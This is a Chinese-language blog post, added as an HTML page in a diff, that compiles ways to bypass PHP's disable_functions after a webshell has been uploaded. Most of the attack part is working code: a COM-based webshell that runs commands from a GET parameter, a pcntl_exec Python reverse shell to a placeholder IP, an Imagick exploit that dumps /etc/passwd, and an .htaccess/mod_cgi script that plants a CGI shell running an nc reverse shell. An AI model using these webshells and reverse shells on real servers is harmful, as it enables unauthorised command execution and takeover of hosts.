@@ -1,0 +1,320 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>disable_functions bypass整理 | chriskali&#39;s blog</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://chriskalix.github.io/favicon.ico?v=1595758982603">
+<link rel="stylesheet" href="https://chriskalix.github.io/styles/main.css">
+
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="
+disable_function，通常在上传了webshell后让人头疼的问题。之前做过绕过，不过没有系统的整理复现过。话题比较老了，做个回顾纪念，大部分为搬运
+
+环境
+phpstudy
+php 7.1.9
+开始前需要手动添加disabl..." />
+    <meta name="keywords" content="" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://chriskalix.github.io">
+        <img src="https://chriskalix.github.io/images/avatar.png?v=1595758982603" class="site-logo">
+        <h1 class="site-title">chriskali&#39;s blog</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      Keep learning
+    </div>
+    <div class="site-footer">
+      chriskalix | <a class="rss" href="https://chriskalix.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">disable_functions bypass整理</h2>
+            <div class="post-date">2020-07-26</div>
+            
+            <div class="post-content" v-pre>
+              <blockquote>
+<p>disable_function，通常在上传了webshell后让人头疼的问题。之前做过绕过，不过没有系统的整理复现过。话题比较老了，做个回顾纪念，大部分为搬运</p>
+</blockquote>
+<h2 id="环境">环境</h2>
+<p>phpstudy<br>
+php 7.1.9</p>
+<p>开始前需要手动添加<code>disable_functions</code>，我配置的为 <code>exec,system,passthru,popen,pclose,shell_exec,proc_open,dl,curl_exec,multi_exec,chmod,gzinflate,set_time_limit</code></p>
+<h2 id="绕过整理">绕过整理</h2>
+<h3 id="0x01-windows-系统组件">0x01 Windows - 系统组件</h3>
+<blockquote>
+<p>适用于Windows下，使用前需要查看COM组件是否开启。windows下5.X默认支持</p>
+</blockquote>
+<p>在 <code>php.ini</code> 中找到 <code>extension=php_com_dotnet.dll</code> 并且开启（若没有则直接添加），结果如下<br>
+<img src="https://chriskalix.github.io/post-images/1595758966523.png" alt="" loading="lazy"></p>
+<p>对于com组件仅简单了解，不做搬运文章的苦力，<a href="https://www.zhihu.com/question/49433640">文章地址</a>。从百度百科抄一句：COM是开发软件组件的一种方法。组件实际上是一些小的二进制可执行程序，它们可以给应用程序，操作系统以及其他组件提供服务。<br>
+通过COM组件，调用WScript.shell（这个在写VBS的时候经常用到）或者shell.application执行系统命令。从安全客上搬运的代码如下：</p>
+<pre><code class="language-php">&lt;?php
+$wsh = isset($_GET['wsh']) ? $_GET['wsh'] : 'wscript';
+if($wsh == 'wscript') {
+    $command = $_GET['cmd'];
+    $wshit = new COM('WScript.shell') or die(&quot;Create Wscript.Shell Failed!&quot;);
+    $exec = $wshit-&gt;exec(&quot;cmd /c&quot;.$command);
+    $stdout = $exec-&gt;StdOut();
+    $stroutput = $stdout-&gt;ReadAll();
+    echo $stroutput;
+}
+elseif($wsh == 'application') {
+    $command = $_GET['cmd'];
+    $wshit = new COM(&quot;Shell.Application&quot;) or die(&quot;Shell.Application Failed!&quot;);
+    $exec = $wshit-&gt;ShellExecute(&quot;cmd&quot;,&quot;/c &quot;.$command);
+} 
+else {
+  echo(0);
+}
+?&gt;
+</code></pre>
+<p>执行效果如下</p>
+<figure data-type="image" tabindex="1"><img src="https://chriskalix.github.io/post-images/1595758973366.png" alt="" loading="lazy"></figure>
+<h3 id="0x02-linux-ld_preload">0x02 Linux - LD_PRELOAD</h3>
+<blockquote>
+<p>条件：1. 能上传.so文件 2. putenv能使用，控制环境变量 3. mail, imap_mail, mb_send_mail, error_log等函数能够调用</p>
+</blockquote>
+<p>相比起来，这个稍微熟悉一点。之前在写Linux下应急响应脚本的时候，就包含LD_PRELOAD的检验。LD_PRELOAD是linux下的预加载环境变量，可以通过导入恶意的.so文件替换环境变量，从而劫持函数。在安全客上有一篇<a href="https://www.anquanke.com/post/id/175403">深入浅出LD_PRELOAD&amp;putenv()</a>。为什么要使用mail之类的函数？因为在设置环境变量后，仅会在请求期间存在，想要使预环境变量被加载，就要找到创建子进程的函数，从而触发恶意.so文件。同样的摸到了仓库<a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD">github - LD_PRELOAD</a>，讲的也很好，在理解的情况下做一点搬运<br>
+通常情况下，大部分文章使用LD_PRELOAD的方法为如下几步：</p>
+<ol>
+<li>编写一个getuid的C函数（为什么是getuid，因为sendmail会用到），编译成xx.so</li>
+<li>运行phpenv，设置LD_PRELOAD为xx.so</li>
+<li>运行mail函数，由于设置了LD_PRELOAD，会优先从xx.so中寻找函数</li>
+<li>执行恶意命令</li>
+</ol>
+<p>但是在实战用会碰到一系列问题，如禁止sendmail，服务器上根本没有安装sendmail。仓库中提到，不要局限于劫持某一个函数，而应考虑<strong>拦截启动进程</strong>。在GCC中有一个C语言的拓展修饰符， <code>__attribute__((constructor))</code> ，可以让由它修饰的函数在<code>main()</code> 函数之前运行。当出现在共享对象中，一旦对象被系统加载，则立即执行由它所修饰的函数。而当启动新进程的时候，又会自动调用该函数，会造成循环阻塞。这里需要注意的是，由于需要调用 <code>unsetenv()</code> ，在centos下是不可行的（具体原因看仓库）。<br>
+在知道原理后直接使用作者的仓库进行尝试：<br>
+<img src="https://chriskalix.github.io/post-images/1595758980470.png" alt="" loading="lazy"></p>
+<p>这里作者提到一个问题，如果目标开启SELinux会导致对outpath没有读写权限，以及.so文件是在debian系统下编译，对于非debian系统需要重新编译。</p>
+<h3 id="0x03-linux-pcntl_exec">0x03 Linux - pcntl_exec</h3>
+<blockquote>
+<p>这个也很早了，文章很多，主要是做个记录</p>
+</blockquote>
+<p>该函数在PHP&gt;4.2.0，5，7中存在。搬运一个python的版本，可以自行修改</p>
+<pre><code class="language-php">&lt;?php
+pcntl_exec(&quot;/usr/bin/python&quot;,array('-c', 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM,socket.SOL_TCP);s.connect((&quot;xxx.xxx.xxx.xxx&quot;,8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);'));?&gt;
+</code></pre>
+<h3 id="0x04-imagick">0x04 imagick</h3>
+<blockquote>
+<p>这个每个文章里基本都有，做个记录吧</p>
+</blockquote>
+<p>还是一样，先在 <code>phpinfo</code> 中先看下是否有该组件。这个在看H1文章会看到，属于组件问题。直接搬运一下RicterZ师傅的代码，url自行更改（不过感觉现在基本没了吧...）</p>
+<pre><code class="language-php"># Exploit Title: PHP Imagick disable_functions Bypass
+# Date: 2016-05-04
+# Exploit Author: RicterZ (ricter@chaitin.com)
+# Vendor Homepage: https://pecl.php.net/package/imagick
+# Version: Imagick  &lt;= 3.3.0 PHP &gt;= 5.4
+# Test on: Ubuntu 12.04
+ 
+# Exploit:
+ 
+&lt;?php
+# PHP Imagick disable_functions Bypass
+# Author: Ricter &lt;ricter@chaitin.com&gt;
+#
+# $ curl &quot;127.0.0.1:8080/exploit.php?cmd=cat%20/etc/passwd&quot;
+# &lt;pre&gt;
+# Disable functions: exec,passthru,shell_exec,system,popen
+# Run command: cat /etc/passwd
+# ====================
+# root:x:0:0:root:/root:/usr/local/bin/fish
+# daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+# bin:x:2:2:bin:/bin:/bin/sh
+# sys:x:3:3:sys:/dev:/bin/sh
+# sync:x:4:65534:sync:/bin:/bin/sync
+# games:x:5:60:games:/usr/games:/bin/sh
+# ...
+# &lt;/pre&gt;
+echo &quot;Disable functions: &quot; . ini_get(&quot;disable_functions&quot;) . &quot;\n&quot;;
+$command = isset($_GET['cmd']) ? $_GET['cmd'] : 'id';
+echo &quot;Run command: $command\n====================\n&quot;;
+ 
+$data_file = tempnam('/tmp', 'img');
+$imagick_file = tempnam('/tmp', 'img');
+ 
+$exploit = &lt;&lt;&lt;EOF
+push graphic-context
+viewbox 0 0 640 480
+fill 'url(https://127.0.0.1/image.jpg&quot;|$command&gt;$data_file&quot;)'
+pop graphic-context
+EOF;
+ 
+file_put_contents(&quot;$imagick_file&quot;, $exploit);
+$thumb = new Imagick();
+$thumb-&gt;readImage(&quot;$imagick_file&quot;);
+$thumb-&gt;writeImage(tempnam('/tmp', 'img'));
+$thumb-&gt;clear();
+$thumb-&gt;destroy();
+ 
+echo file_get_contents($data_file);
+?&gt;
+</code></pre>
+<h3 id="0x05-htaccess">0x05 .htaccess</h3>
+<blockquote>
+<p>.htaccess，做配置的时候老见到了，也有用来做后门隐藏的，总之用法很多</p>
+</blockquote>
+<p>（搬运一下）有如下条件：</p>
+<ol>
+<li>必须是apache</li>
+<li>mod_cgi</li>
+<li>运行.htaccess生效</li>
+<li>有写.htaccess的权限</li>
+</ol>
+<pre><code class="language-php">&lt;?php
+$cmd = &quot;nc -c'/bin/bash' 127.0.0.1 4444&quot;; //反弹一个shell出来，这里用本地的4444端口
+$shellfile =&quot;#!/bin/bash\n&quot;; //指定shell
+$shellfile .=&quot;echo -ne \&quot;Content-Type: text/html\\n\\n\&quot;\n&quot;; //需要指定这个header，否则会返回500
+$shellfile .=&quot;$cmd&quot;; 
+functioncheckEnabled($text,$condition,$yes,$no) //this surely can be shorter
+{
+    echo &quot;$text: &quot; . ($condition ?$yes : $no) . &quot;&lt;br&gt;\n&quot;;
+}
+if(!isset($_GET['checked']))
+{
+    @file_put_contents('.htaccess',&quot;\nSetEnv HTACCESS on&quot;, FILE_APPEND); 
+    header('Location: ' . $_SERVER['PHP_SELF']. '?checked=true'); //执行环境的检查
+}
+else
+{
+    $modcgi = in_array('mod_cgi',apache_get_modules()); // 检测mod_cgi是否开启
+    $writable = is_writable('.'); //检测当前目录是否可写
+    $htaccess = !empty($_SERVER['HTACCESS']);//检测是否启用了.htaccess
+        checkEnabled(&quot;Mod-Cgienabled&quot;,$modcgi,&quot;Yes&quot;,&quot;No&quot;);
+        checkEnabled(&quot;Iswritable&quot;,$writable,&quot;Yes&quot;,&quot;No&quot;);
+        checkEnabled(&quot;htaccessworking&quot;,$htaccess,&quot;Yes&quot;,&quot;No&quot;);
+    if(!($modcgi &amp;&amp; $writable&amp;&amp; $htaccess))
+    {
+        echo &quot;Error. All of the above mustbe true for the script to work!&quot;; //必须满足所有条件
+    }
+    else
+    {
+       
+ checkEnabled(&quot;Backing 
+up.htaccess&quot;,copy(&quot;.htaccess&quot;,&quot;.htaccess.bak&quot;),&quot;Suceeded!Saved in 
+.htaccess.bak&quot;,&quot;Failed!&quot;); //备份一下原有.htaccess
+        
+checkEnabled(&quot;Write 
+.htaccessfile&quot;,file_put_contents('.htaccess',&quot;Options 
++ExecCGI\nAddHandlercgi-script 
+.dizzle&quot;),&quot;Succeeded!&quot;,&quot;Failed!&quot;);//.dizzle，我们的特定扩展名
+        checkEnabled(&quot;Write shellfile&quot;,file_put_contents('shell.dizzle',$shellfile),&quot;Succeeded!&quot;,&quot;Failed!&quot;);//写入文件
+        checkEnabled(&quot;Chmod777&quot;,chmod(&quot;shell.dizzle&quot;,0777),&quot;Succeeded!&quot;,&quot;Failed!&quot;);//给权限
+        echo &quot;Executing the script now.Check your listener &lt;img src = 'shell.dizzle' style ='display:none;'&gt;&quot;; //调用
+    }
+}
+?&gt;
+</code></pre>
+<h2 id="参考">参考</h2>
+<p><a href="https://xz.aliyun.com/t/5320#toc-0">先知文章</a><br>
+<a href="https://baijiahao.baidu.com/s?id=1659386031704746677&amp;wfr=spider&amp;for=pc">E安全</a></p>
+
+            </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://chriskalix.github.io/post/2cLB43Y5A/">
+                  <h3 class="post-title">
+                    域渗透整理复现
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+
+
+  </body>
+</html>
